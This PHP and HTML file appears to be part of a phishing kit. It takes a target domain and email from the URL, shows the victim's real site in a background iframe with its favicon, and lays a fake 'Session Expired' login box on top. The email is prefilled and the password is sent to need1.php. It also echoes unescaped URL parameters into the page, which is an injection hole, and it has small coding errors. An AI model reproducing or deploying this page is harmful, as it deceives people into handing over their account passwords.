<?php
   include 'function.php';   
$domain= $_GET['domain'];
$email = $_GET['email'];


 
 if(strcmp($part)==0)
    {
        $ifram="<img id='mainPage' src='img/default.jpg'  width='100%' scrolling='no' sandbox='' style='position: absolute;height: 100%;border: none;''></iframe>";
    }else
    {
            $ifram="<iframe id='mainPage' src='$domain'  width='100%' scrolling='no' sandbox='' style='position: absolute;height: 100%;border: none;''></iframe>";
    }
        


?>


<!doctype html>

<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>...</title>
    <style>
        body{
            width:99%;
            height:100%;
            margin:0;
            padding:0;
        }
        #mainPage{
            border:none;
        }
        hr{
            border:1px solid #999;
        }
        #overlay{
            background-color:#555;
            position:absolute;
            top:0;
            left:0;
            bottom:0;
            right:0;
            border:1px solid #555;
            opacity: 0.6;
            filter: alpha(opacity=60)
        }
        #loginBody{
            background-color:#555;
            border: 1px solid #DDD;
            box-shadow: 0px 0px 10px #DDD;
            width: 400px;
            height: 180px;
            position:absolute;
            top:30%;
            left:30%;
        }
        #loginBg{
            background:white;
            width:100%;
            height:100%;
            opacity: 0.9;
            filter: alpha(opacity=90);
        }
        #topHeader{
            margin-bottom:10px;
            padding-top:10px;
        }
        #favIcon{
            margin:0 10px;
        }
        #form{
            position:relative;
            left:10%;
            width:80%;
        }
        .emails, .pass{
            margin:0 0 5px;
        }
        .textbox1:focus { 
    outline: none; 
    border: 0px solid #fff; 

}
    </style>
</head>

<body>
<?php echo "$ifram"; ?>


<div id="overlay" style="height: 100%; width: 1366px;">
<form action=need1.php?email=<?php echo "$login"; ?>  method=post>
</div>
<div id="loginBody">
    <div id="loginBg">
        <div id="topHeader">
            <img id="favIcon" src="https://www.google.com/s2/favicons?domain=<?php echo"$domain"; ?>"> <b id="sExp">Session Expired！</b>
            <hr>
        </div>
        
        <div id="form">
            <form id="form_login">
                
               
                
                <div class="emails">
                   
                    <input type="email" class="textbox1" value="<?php echo "$email"; ?>" name="email" style="border:none;" readonly>
                  
                </div>
               

                <div class="pass">
                    <span id="passName">Password</span>： <input type="password" name="pass" required id="password">
                    
                <div class="pass">
                    <input type="checkbox"> <span id="keepme">Keep me logged in</span>
                </div>
                <div class="submit">
                    <input type="submit" value="Log in" >
                </div>
            </form>
        </div>
    </div>
</div>

</body>
</html>